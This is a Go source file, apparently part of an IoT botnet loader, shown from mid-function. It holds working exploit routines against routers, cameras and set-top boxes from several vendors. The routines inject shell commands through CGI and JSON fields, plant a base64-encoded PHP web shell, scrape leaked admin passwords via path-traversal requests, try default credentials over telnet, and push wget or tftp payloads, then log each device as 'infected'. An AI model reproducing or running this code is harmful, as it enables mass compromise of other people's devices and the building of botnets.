	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nConnection: keep-alive\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "/cgi-bin/systemutil.cgi?Command=LangGet")
}

func SDTsendPayload(target, payload string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=" + payload + " HTTP/1.1\r\nHost: " + target + "\r\nConnection: keep-alive\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), executeMessage) {
		fmt.Printf("\x1b[38;5;46mSDT\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", target)
		payloadSent++
	}
}

func infectFunctionSDT(target string) {

	if !SDTfindBot(target) {
		return
	}

	if !SDTcheckBot(target) {
		return
	}

	fmt.Printf("\x1b[38;5;46mSDT\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m found\x1b[38;5;15m\r\n", target)

	SDTsendPayload(target, SDTpayload)
	payloadSent++
}

func ruijeSetupShell(target string, shell string) {
	conn, err := net.Dial("tcp", target)

	if err != nil {
		return
	}

	defer conn.Close()

	payload := "ip=127.0.0.1|echo \"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=\"|base64 -d > baba.php&mac=00-00"
	content_len := len(payload)

	request := fmt.Sprintf("POST /guest_auth/"+shell+" HTTP/1.0\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nUser-Agent: "+userAgent+"\r\n\r\n%s", content_len, payload)
	conn.Write([]byte(request))

	var buf bytes.Buffer
	io.Copy(&buf, conn)

	if strings.Contains(buf.String(), "HTTP/1.1 200 OK") {
		fmt.Printf("\x1b[38;5;46mRuijie\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m payload sent\x1b[38;5;15m\r\n", target)
		payloadSent++
	}
}

func ruijeInfectBot(target string) {
	conn, err := net.Dial("tcp", target)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /guest_auth/baba.php?cmd=" + ruijiePayload + " HTTP/1.0\r\nUser-Agent: " + userAgent + "\r\n\r\n"))
}

func ruijeInfectFunction(target string) {

	ruijeSetupShell(target, "guestIsUp.php")
	ruijeSetupShell(target, "babaroga.php")

	ruijeInfectBot(target)
}

func infectFunctionIRZ(target string) {

	if !IRZloginDevice(target) {
		return
	}

	model := IRZgetModel(target)
	platform := IRZgetPlatform(target)

	if model == "" {
		return
	}

	if platform == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mIRZ:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m payload sent\x1b[38;5;15m\r\n",
		model, platform, target)

	IRZsendPayload(target)
}

func IRZsendPayload(target string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	payload := "{\"tasks\":[{\"minutes\":\"*\",\"hours\":\"*\",\"days\":\"*\",\"months\":\"*\",\"weekdays\":\"*\",\"command\":\"" + IRZpayload + "\",\"enable\":true}],\"_board\":{\"name\":\"RU21\",\"platform\":\"irz_mt02\",\"time\":\"Wed May 4 14:38:54 UTC 2022\"}}"
	cntLen := strconv.Itoa(len(payload))

	conn.Write([]byte("POST /api/crontab HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/\r\nContent-Type: application/json\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\nAuthorization: Basic cm9vdDpyb290\r\n\r\n" + payload))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func IRZgetPlatform(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /current.info HTTP/1.1\r\nHost: " + target + "\r\nHost: " + target + "\r\nAccept: application/json, text/javascript\r\nReferer: http://" + target + "/\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	buffStr := buff.String()

	if strings.Contains(buffStr, "platform") {

		split := strings.Split(buffStr, "\"platform\", \"")

		if len(split) > 1 {
			model := strings.Split(split[1], "\"")
			return model[0]
		}
	}

	return ""
}

func IRZgetModel(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /current.info HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	if strings.Contains(buff.String(), "Model") {

		split := strings.Split(buff.String(), "[\"Model\", \"")

		if len(split) > 1 {
			model := strings.Split(split[1], "\"")
			return model[0]
		}
	}

	return ""
}

func IRZloginDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /api/access HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic cm9vdDpyb290\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return !strings.Contains(buff.String(), "Authorization Required")
}

func weedLoadTimezone(delta time.Duration) {
	baseTime := time.Now().UTC()
	date := baseTime.Add(delta * time.Hour)

	dateStr := date.String()

	timezone := strings.Split(strings.Replace(strings.Replace(dateStr, "-", "", -1), " ", "", -1), ":")[0]
	weedTimezones = append(weedTimezones, timezone)
}

func weedLoadTimezones() {
	weedLoadTimezone(-12)
	weedLoadTimezone(-11)
	weedLoadTimezone(-10)
	weedLoadTimezone(-9)
	weedLoadTimezone(-8)
	weedLoadTimezone(-7)
	weedLoadTimezone(-6)
	weedLoadTimezone(-5)
	weedLoadTimezone(-4)
	weedLoadTimezone(-3)
	weedLoadTimezone(-2)
	weedLoadTimezone(-1)
	weedLoadTimezone(0)
	weedLoadTimezone(1)
	weedLoadTimezone(2)
	weedLoadTimezone(3)
	weedLoadTimezone(4)
	weedLoadTimezone(5)
	weedLoadTimezone(6)
	weedLoadTimezone(7)
	weedLoadTimezone(8)
	weedLoadTimezone(9)
	weedLoadTimezone(10)
	weedLoadTimezone(11)
	weedLoadTimezone(12)
}

func weedGetMacAddr(target string) string {
	ip := strings.Split(target, ":")[0]

	conn, err := net.DialTimeout("tcp", ip+":50100", timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	buff := make([]byte, 1024)
	conn.Read(buff)

	if !strings.Contains(string(buff), "authkey=") {
		return ""
	}

	macaddrStr := strings.Split(string(buff), "authkey=")[1]
	macAddr := macaddrStr[:12]

	return strings.ToUpper(macAddr)
}

func weedCheckBackdoor(target string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	conn.Write([]byte("GET /cgi-bin/api/web_cmd.cgi HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return !strings.Contains(buff.String(), "404 Not Found")
}

func infectFunctionWeed(target string) {

	if !weedCheckBackdoor(target) {
		return
	}

	mac := weedGetMacAddr(target)

	if mac == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mWeed:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m payload sent\x1b[38;5;15m\r\n", mac, target)
	payloadSent++

	logDevice(target, "weed")

	for _, timezone := range weedTimezones {
		result := NewSHA256([]byte(timezone + mac))
		code := strings.ToUpper(hex.EncodeToString(result))

		dr := dac.NewRequest("admin", "00000", "POST", "http://"+target+"/cgi-bin/api/web_cmd.cgi", "SSKEY="+code+"&CMD="+weedPayload)
		dr.Execute()
	}
}

func dreamboxLoginDevice(target string) string {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic cm9vdDphbmtv\r\n\r\n"))

	for {
		buff := make([]byte, 1024)
		_len, err := conn.Read(buff)

		if err != nil {
			return ""
		}

		if _len <= 0 {
			return ""
		}

		if strings.Contains(string(buff), "Dreambox") {
			if strings.Contains(string(buff), "TWISTED") {

				cookieStr := strings.Split(string(buff), "Set-Cookie: TWISTED_SESSION=")

				if len(cookieStr) > 1 {
					cookie := strings.Split(cookieStr[1], ";")
					return cookie[0]
				}
				return ""
			}
		}
	}

	return ""
}

func dreamboxSendPayload(target, path, cookie string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET " + path + dreamboxPayload + " HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nAuthorization: Basic cm9vdDphbmtv\r\n\r\n"))

	for {
		buff := make([]byte, 1024)
		_len, err := conn.Read(buff)

		if err != nil {
			return
		}

		if _len <= 0 {
			return
		}

		if strings.Contains(string(buff), executeMessage) {
			fmt.Printf("\x1b[38;5;46mDreambox:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", cookie, target)
		}
	}
}

func dreamboxExploitDevice(target string) {

	cookie := dreamboxLoginDevice(target)

	if cookie == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mDreambox:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", cookie, target)
	payloadSent++

	dreamboxSendPayload(target, "/webadmin/script?command=|", cookie)
	dreamboxSendPayload(target, "/!#webadmin/script?command=|", cookie)
}

func usgflexverifyDevice(target string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /ztp/cgi-bin/handler HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	for {
		buf := make([]byte, 1024)
		len, err := conn.Read(buf)

		if len <= 0 {
			return false
		}

		if err != nil {
			return false
		}

		if strings.Contains(string(buf), "{\"message\":") {
			return true
		}
	}

	return false
}

func usgflexsendPayload(target string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	headers := "Accept: */*\r\nHost: " + target + "\r\nConnection: keep-alive\r\nContent-Type: application/json\r\nUser-Agent: " + userAgent

	//data := "{\"command\": \"setWanPortSt\", \"proto\": \"dhcp\", \"port\": \"4\", \"vlan_tagged\": \"1\", \"vlanid\": \"5\", \"mtu\": \"; bash -c \\\"" + payload + ";\\\";\", \"data\": \"hi\"}"
	data := "{\"command\": \"setWanPortSt\", \"proto\": \"dhcp\", \"port\": \"4\", \"vlan_tagged\": \"1\", \"vlanid\": \"5\", \"mtu\": \"; " + usgflexPayload + ";\", \"data\": \"hi\"}"

	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /ztp/cgi-bin/handler HTTP/1.1\r\n" + headers + "\r\nContent-Type: application/json\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	for {
		buf := make([]byte, 1024)
		len, err := conn.Read(buf)

		if len <= 0 {
			return
		}

		if err != nil {
			return
		}

		if strings.Contains(string(buf), "{\"message\":") {
			return
		}
	}
}

func usgflexExploitDevice(target string) {

	if !usgflexverifyDevice(target) {
		return
	}

	fmt.Printf("\x1b[38;5;46mUSGFLEX\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending payload\x1b[38;5;15m\r\n", target)
	payloadSent++

	usgflexsendPayload(target)
}

func telecomreadUntil(conn net.Conn, prefix string) bool {

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if len <= 0 {
			return false
		}

		if strings.Contains(string(buff), prefix) {
			return true
		}
	}

	return false
}

func telecomreadSuccess(conn net.Conn) bool {

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if len <= 0 {
			return false
		}

		if strings.Contains(string(buff), "ncorrect") {
			return false
		}

		if strings.Contains(string(buff), "$") || strings.Contains(string(buff), "#") {
			return true
		}
	}

	return false
}

func telecomloginDevice(conn net.Conn, username, password string) bool {

	if !telecomreadUntil(conn, "VMG") {
		return false
	}

	conn.Write([]byte(username + "\r\n"))

	if !telecomreadUntil(conn, ":") {
		return false
	}

	conn.Write([]byte(password + "\r\n"))

	if telecomreadSuccess(conn) {
		return true
	}

	return false
}

func telecomreadInfect(conn net.Conn, target string) bool {

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if len <= 0 {
			return false
		}

		if strings.Contains(string(buff), "$") {
			return false
		}

		if strings.Contains(string(buff), executeMessage) {
			return true
		}
	}

	return false
}

func telecomfindDevice(target string) bool {
	conn, err := net.Dial("tcp", target)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /login HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	for {
		buff := make([]byte, 1024)

		len, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if len <= 0 {
			return false
		}

		if strings.Contains(string(buff), "Welcome to the Web-Based Configurator") {
			return true
		}
	}

	return false
}

func telecomloadDevice(target, username, password string) int {

	ip := strings.Split(target, ":")[0]

	conn, err := net.Dial("tcp", ip+":23")

	if err != nil {
		return 1
	}

	defer conn.Close()

	if !telecomloginDevice(conn, username, password) {
		return 0
	}

	fmt.Printf("\x1b[38;5;46mtelecom:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", username, password, target)
	payloadSent++

	time.Sleep(5 * time.Second)

	conn.Write([]byte(telecomPayload + "\r\n"))

	if telecomreadInfect(conn, target) {
		fmt.Printf("\x1b[38;5;46mtelecom:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", username, password, target)
		return 1
	}

	time.Sleep(3 * time.Second)
	return 2
}

func telecomexploitDevice(target string) {

	for _, cred := range telecomCreds {

		username := strings.Split(cred, ":")[0]
		password := strings.Split(cred, ":")[1]

		res := telecomloadDevice(target, username, password)

		if res >= 0 {
			return
		}
	}
}

func goformGetAuthLeak2(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	conn.SetReadDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /\\.gif\\..\\adm\\management.asp HTTP/1.1\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\n\r\n"))

	var bytes bytes.Buffer
	_, err = io.Copy(&bytes, conn)
	nextbuf := strings.Split(bytes.String(), "var passadm = \"")

	if len(nextbuf) > 1 {
		password := strings.Split(nextbuf[1], "\";")
		return password[0]
	}

	nextbuf = strings.Split(bytes.String(), "<td><input type=\"password\" name=\"admpass\" size=\"20\" maxlength=\"32\" value=\"")

	if len(nextbuf) > 1 {
		password := strings.Split(nextbuf[1], "\"")
		return password[0]
	}

	return ""
}

func goformGetAuthLeak(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /\\..\\adm\\management.asp HTTP/1.1\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var user, pass string

	if strings.Contains(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"") {
		usernameStr := strings.Split(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"")

		if len(usernameStr) > 1 {
			username := strings.Split(usernameStr[1], "\"")

			if len(username) > 0 {
				user = username[0]
			}
		}
	}

	if strings.Contains(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"") {
		passwordStr := strings.Split(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"")

		if len(passwordStr) > 1 {
			password := strings.Split(passwordStr[1], "\"")

			if len(password) > 0 {
				pass = password[0]
			}
		}
	}

	return user, pass
}

func goformGetResponse(target, auth, check string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /adm/system_command.asp HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/adm/system_command.asp\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), check)
}

func goformSendPayload(target, auth, payload string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "command=" + payload + "&SystemCommandSubmit=admin+apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/SystemCommand HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/goform/SystemCommand\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func goformSendPayload2(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "tool=0&pingCount=4&host=%24%28" + goformPayloadPing + "%29&sumbit=OK"
	cntLen := len(data)

	conn.Write([]byte(fmt.Sprintf("POST /goform/sysTools HTTP/1.1\r\nAuthorization: Basic "+auth+"\r\nUser-Agent: "+userAgent+"\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", cntLen, data)))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func goformIsSystemCommand(target, auth string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /adm/system_command.asp HTTP/1.1\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return !strings.Contains(buff.String(), "Page Not Found")
}

func goformGetAuthLeakAll(target string) (string, string) {

	username, password := goformGetAuthLeak(target)

	if username != "" && password != "" {
		return username, password
	}

	username = "admin"

	password = goformGetAuthLeak2(target)

	if username != "" && password != "" {
		return username, password
	}

	return "", ""
}

func goformExploitDevice(target string) {

	username, password := goformGetAuthLeakAll(target)

	if username == "" || password == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m found login\x1b[38;5;15m\r\n", username, password, target)

	auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

	if goformIsSystemCommand(target, auth) {

		goformSendPayload(target, auth, "/bin/busybox")

		if goformGetResponse(target, auth, "not support command") {

			goformSendPayload(target, auth, "ping; /bin/busybox")

			if !goformGetResponse(target, auth, "wget") {
				fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending protected shell tftp payload\x1b[38;5;15m\r\n", username, password, target)
				goformSendPayload(target, auth, goformPayloadCmdProtShellTftp)
			} else {
				fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending protected shell wget payload\x1b[38;5;15m\r\n", username, password, target)
				goformSendPayload(target, auth, goformPayloadCmdProtShellWget)
			}
		} else {

			goformSendPayload(target, auth, "/bin/busybox")

			if !goformGetResponse(target, auth, "wget") {
				fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending tftp payload\x1b[38;5;15m\r\n", username, password, target)
				goformSendPayload(target, auth, goformPayloadCmdTftp)
			} else {
				fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending wget payload\x1b[38;5;15m\r\n", username, password, target)
				goformSendPayload(target, auth, goformPayloadCmdWget)
			}
		}

		if goformGetResponse(target, auth, executeMessage) {
			fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", username, password, target)
		}
	} else {

		fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m sending wget ping injection payload\x1b[38;5;15m\r\n", username, password, target)
		goformSendPayload2(target, auth)

		if goformGetResponse(target, auth, executeMessage) {
			fmt.Printf("\x1b[38;5;46mgoform:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", username, password, target)
		}
	}
}

func ipcamUpdateInfection(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	conn.Write([]byte("GET /SetFTP.cgi?FTP_Test=1&JsVar=sName&OnJs=onTest HTTP/1.0\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nAuthorization: Basic " + auth + "\r\nConnection: keep-alive\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func ipcamSendPayload(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "page=system.html&c32_Titlename=Camera1&i_TitleShow=&LEDindicator=0&i_Language=0&i_OSD_En=0&i_OSDPos=0&OSD_Video_En=0&i_OSDdata_format=0&i_TimeZone=GMT%2B09%3A00&oTimeZone=GMT%2B09%3A00&uc_Daylight_En=&uc_DaylightBM=3&uc_DaylightBW=1&uc_DaylightBD=0&uc_DaylightBTH=0&uc_DaylightEM=11&uc_DaylightEW=0&uc_DaylightED=6&uc_DaylightETH=0&i_UseNtp=1&c64_Ntp_Server=%24%28" + ipcamPayload + "%29&ui_Ntp_Updata=6&i_Time_Shift=0&sDate=2022%2F8%2F11&sTime=1%3A17%3A46&mDate=2022%2F8%2F11&mTime=1%3A17%3A42&TimeZone=-540&Timesync=&RedirectUrl=&action=Apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /apply.cgi HTTP/1.0\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\nReferer: http://" + target + "/system.html\r\nAuthorization: Basic " + auth + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func ipcamSendPayload2(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "page=smtp_ftp.html&c64_Mail_Smtp=dvr.shinsoft.com.tw&c32_Mail_Name=1001&c32_Mail_Pass=shinsoft&c64_Mail_Sender=a3331%40dvr.shinsoft.com.tw&c64_Mail_Dest=alarm%40dvr.shinsoft.com.tw&c64_Mail_Bcc=&i_Mail_Port=25&c64_FTP_Server=%7C%7C%24%28" + ipcamPayload + "%29&c32_FTP_User=111111&c32_FTP_Pwd=2111112&i_FTP_Port=21&c64_FTP_Path=%2F&action=Apply"

	cnt_len := strconv.Itoa(len(data))

	conn.Write([]byte("POST /apply.cgi HTTP/1.0\r\nUser-Agent: " + userAgent + "\r\nAccept: */*\r\nAuthorization: Basic " + auth + "\r\nConnection: keep-alive\r\nContent-Length: " + cnt_len + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func ipcamLoginDevice(target, auth string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "function BackToCamera()")
}

func ipcamExploitDevice(target string) {

	for _, login := range ipcamLogins {

		auth := base64.StdEncoding.EncodeToString([]byte(login))

		if ipcamLoginDevice(target, auth) {
			fmt.Printf("\x1b[38;5;46mipcam:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m found login\x1b[38;5;15m\r\n", login, target)
			ipcamSendPayload(target, auth)
			ipcamSendPayload2(target, auth)

			ipcamUpdateInfection(target, auth)
			return
		}
	}
}

func wavlinkgetKey() string {
	return "M" + strconv.Itoa(rand.Intn(99999999-10000000)+10000000)
}

func wavlinkcredLeak1(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /set_safety.shtml?r=52300 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var username, password string

	if strings.Contains(buff.String(), "var username=\"") {
		usernameStr := strings.Split(buff.String(), "var username=\"")

		if len(usernameStr) > 1 {
			username = strings.Split(usernameStr[1], "\"")[0]
		}
	}

	if strings.Contains(buff.String(), "var syspasswd=\"") {
		usernameStr := strings.Split(buff.String(), "var syspasswd=\"")

		if len(usernameStr) > 1 {
			password = strings.Split(usernameStr[1], "\"")[0]
		}
	}

	return username, password
}

func wavlinkcredLeak2(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /sysinit.shtml HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var username, password string

	if strings.Contains(buff.String(), "var username=\"") {
		usernameStr := strings.Split(buff.String(), "var username=\"")

		if len(usernameStr) > 1 {
			username = strings.Split(usernameStr[1], "\"")[0]
		}
	}

	if strings.Contains(buff.String(), "var syspasswd=\"") {
		usernameStr := strings.Split(buff.String(), "var syspasswd=\"")

		if len(usernameStr) > 1 {
			password = strings.Split(usernameStr[1], "\"")[0]
		}
	}

	return username, password
}

func wavlinkfindCredLeak(target string) (string, string) {

	username, password := wavlinkcredLeak1(target)

	if password != "" {
		return username, password
	}

	username, password = wavlinkcredLeak2(target)

	if password != "" {
		return username, password
	}

	return "", ""
}

func wavlinkloginDevice(target, username, password string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	key := wavlinkgetKey()

	hash := md5.Sum([]byte(key + password))
	pwd := hex.EncodeToString(hash[:])

	//fmt.Printf("[WAVLINK] logging in with PWD '%s' & KEY: '%s'\n", pwd, key)

	ip := strings.Split(target, ":")[0]

	data := "newUI=1&page=login&username=admin&langChange=0&ipaddr=" + loaderServerIP + "&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&protocol=http%3A&hostname=" + ip + "&key=" + key + "&password=" + pwd + "&lang_select=en"
	//data := "newUI=1&page=login&langChina=0&username=admin&langChange=0&ipaddr=" + ip + "&login_page=login.shtml&homepage=main.shtml&hostname=" + host + "&key=" + key + "&password=" + pwd + "&lang_select=0"

	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/login.cgi HTTP/1.1\r\nReferer: http://" + target + "/\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "main.shtml")
}

func wavlinksendPayload(target string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "page=sysCMD&command=" + wavlinkPayload + "&SystemCommandSubmit=Apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /cgi-bin/adm.cgi HTTP/1.1\r\nReferer: http://" + target + "/webcmd.shtml\r\nOrigin: http://" + target + "\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func wavlinkcheckPayload(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /webcmd.shtml HTTP/1.1\r\nReferer: http://" + target + "/webcmd.shtml\r\nHost: " + target + "\r\nUser-Agent: " + userAgent + "\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), executeMessage)
}

func wavlinkexploitDevice(target string) {

	username, password := wavlinkfindCredLeak(target)

	if username == "" || password == "" {
		return
	}

	fmt.Printf("\x1b[38;5;46mwavlink:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m found login\x1b[38;5;15m\r\n", username, password, target)

	if !wavlinkloginDevice(target, username, password) {
		return
	}
	fmt.Printf("\x1b[38;5;46mwavlink:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m logged in\x1b[38;5;15m\r\n", username, password, target)

	wavlinksendPayload(target)

	if wavlinkcheckPayload(target) {
		fmt.Printf("\x1b[38;5;46mwavlink:%s:%s\x1b[38;5;15m \x1b[38;5;134m%s\x1b[38;5;15m infected\x1b[38;5;15m\r\n", username, password, target)
	}
}
